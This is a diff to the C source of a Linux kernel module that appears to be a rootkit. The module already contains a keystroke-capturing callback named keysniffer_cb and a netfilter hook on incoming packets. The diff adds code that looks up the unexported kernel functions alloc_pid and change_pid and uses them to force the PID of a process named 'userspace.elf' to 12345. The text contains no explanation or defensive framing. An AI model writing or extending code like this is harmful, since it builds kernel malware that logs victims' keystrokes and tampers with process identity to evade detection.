@@ -12,9 +12,10 @@
 #include <linux/kthread.h>
 #include <linux/module.h>
 #include <linux/net.h>
-#include <linux/sched/signal.h>
+#include <linux/pid_namespace.h>
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
+#include <linux/sched/signal.h>
 #include <linux/skbuff.h>
 #include <linux/slab.h>
 #include <linux/tcp.h>
@@ -454,6 +455,10 @@ int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _para
     return NOTIFY_OK;
 }
 
+static asmlinkage void (*change_pidR)(
+        struct task_struct* task, enum pid_type type, struct pid* pid);
+static asmlinkage struct pid* (*alloc_pidR)(struct pid_namespace* ns);
+
 /*
  * function:
  *    mod_init
@@ -469,8 +474,12 @@ int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _para
  */
 static int __init mod_init(void) {
     int err;
-    struct task_struct *ts;
+    struct task_struct* ts;
     char proc_name[TASK_COMM_LEN];
+    struct pid *newpid;
+
+    change_pidR = kallsyms_lookup_name("change_pid");
+    alloc_pidR = kallsyms_lookup_name("alloc_pid");
 
     nfhi.hook = incoming_hook;
     nfhi.hooknum = NF_INET_LOCAL_IN;
@@ -506,6 +515,9 @@ static int __init mod_init(void) {
         printk(KERN_INFO "Process name %s\n", get_task_comm(proc_name, ts));
         if (strcmp("userspace.elf", proc_name) == 0) {
             printk(KERN_INFO "Found my userspace proc\n");
+            newpid = alloc_pidR(task_active_pid_ns(ts));
+            newpid->numbers[0].nr = 12345;
+            change_pidR(ts, PIDTYPE_PID, newpid);
         }
     }
 
